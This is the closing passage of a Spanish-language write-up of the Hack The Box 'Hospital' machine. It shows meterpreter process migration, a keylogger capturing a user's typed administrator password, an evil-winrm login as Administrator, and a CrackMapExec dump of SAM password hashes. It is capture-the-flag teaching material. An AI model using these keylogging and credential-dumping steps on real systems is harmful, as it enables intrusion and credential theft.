 7316  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
                                                       ker.exe
 7396  1540  powershel  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             l.exe                     wn              em32<span class="se">\W</span>indowsPow
                                                       erShell<span class="se">\v</span>1.0<span class="se">\p</span>o
                                                       wershell.exe
 7496  656   svchost.e
             xe
 7548  5528  vmwp.exe
 7636  7876  iexplore.  x86   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             exe                       wn              s <span class="o">(</span>x86<span class="o">)</span><span class="se">\I</span>nterne
                                                       t Explorer<span class="se">\i</span>exp
                                                       lore.exe
 7672  656   svchost.e
             xe
 7824  912   RuntimeBr  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\W</span>indows<span class="se">\S</span>yst
             oker.exe                  wn              em32<span class="se">\R</span>untimeBro
                                                       ker.exe
 7876  6256  iexplore.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             exe                       wn              s<span class="se">\i</span>nternet expl
                                                       orer<span class="se">\i</span>explore.e
                                                       xe
 7948  6188  vmtoolsd.  x64   1        HOSPITAL<span class="se">\d</span>rbro  C:<span class="se">\P</span>rogram File
             exe                       wn              s<span class="se">\V</span>Mware<span class="se">\V</span>Mware
                                                        Tools<span class="se">\v</span>mtoolsd
                                                       .exe

meterpreter <span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos que el <code class="language-plaintext highlighter-rouge">Dr</code> esta corriendo  <code class="language-plaintext highlighter-rouge">iexplore.exe</code> como la sesión activa es del doctor el es el que esta corriendo el servicio en lo que consiste esta escalada es un hacer un <code class="language-plaintext highlighter-rouge">keylogger</code> para ver lo que hace el <code class="language-plaintext highlighter-rouge">Dr</code> con el proceso.</p>
  </li>
  <li>
    <p>Vamos a migrar al proceso.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> migrate 7824
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migrating from 3452 to 7824...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migration completed successfully.
meterpreter <span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora iniciamos el <code class="language-plaintext highlighter-rouge">keylogger</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> keyscan_start
Starting the keystroke sniffer ...
</code></pre></div></div>

<ul>
  <li>Ahora vamos a esperar unos minutos para ver que información capturamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> keyscan_dump
Dumping captured keystrokes...
administratorTh3B3stH0sp1t4l9786!
</code></pre></div></div>

<ul>
  <li>Y bueno obtenemos credenciales que lo que parece ser son del administrador.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ evil-winrm <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'Th3B3stH0sp1t4l9786!'</span> <span class="nt">-i</span> 10.10.11.241

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>hospital<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="hashes">Hashes</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ cme smb 10.10.11.241 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'Th3B3stH0sp1t4l9786!'</span> <span class="nt">--sam</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:hospital.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>+] hospital.htb<span class="se">\A</span>dministrator:Th3B3stH0sp1t4l9786! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.10.11.241    445    DC               <span class="o">[</span>+] Dumping SAM hashes
SMB         10.10.11.241    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:e1ae906d259a980297d5eb72aa7ba35c:::
SMB         10.10.11.241    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.241    445    DC               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ERROR:root:SAM hashes extraction <span class="k">for </span>user WDAGUtilityAccount failed. The account doesn<span class="s1">'t have hash information.
SMB         10.10.11.241    445    DC               [+] Added 3 SAM hashes to the database
</span></code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/medium/2024/05/12/hospital.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
